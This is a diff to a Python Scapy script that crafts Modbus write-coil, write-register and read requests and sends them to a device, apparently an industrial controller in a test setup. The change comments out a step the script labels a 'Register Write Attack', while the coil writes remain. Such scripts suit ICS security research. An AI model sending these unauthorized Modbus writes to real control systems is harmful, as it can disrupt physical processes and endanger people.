@@ -36,8 +36,8 @@ write_coil_low=ModbusADURequest()/ModbusPDU05WriteSingleCoilRequest(outputAddr=2
 write_coil_high=ModbusADURequest()/ModbusPDU05WriteSingleCoilRequest(outputAddr=2,outputValue=1)
 
 #Write to button
-write_register_high=ModbusADURequest()/ModbusPDU06WriteSingleRegisterRequest(outputAddr=2,outputValue=1)
-write_register_low=ModbusADURequest()/ModbusPDU06WriteSingleRegisterRequest(outputAddr=2,outputValue=0)
+#write_register_high=ModbusADURequest()/ModbusPDU06WriteSingleRegisterRequest(outputAddr=2,outputValue=1)
+#write_register_low=ModbusADURequest()/ModbusPDU06WriteSingleRegisterRequest(outputAddr=2,outputValue=0)
 
 
 write_multiple_coils_low=ModbusADURequest()/ModbusPDU0FWriteMultipleCoilsRequest(outputsValue=[0],startingAddr=2,quantityOutput=1)
@@ -75,11 +75,11 @@ for i in range(0,5):
     stream.sr(read_discrete_inputs)
     time.sleep(0.5)
 
-stream.sr(write_register_high)
-time.sleep(1)
-stream.sr(write_register_low)
-print "Sent Register Write Attack"
-time.sleep(0.5)
+#stream.sr(write_register_high)
+#time.sleep(1)
+#stream.sr(write_register_low)
+#print "Sent Register Write Attack"
+#time.sleep(0.5)
 
 for i in range(0,5):
     stream.sr(read_coils)
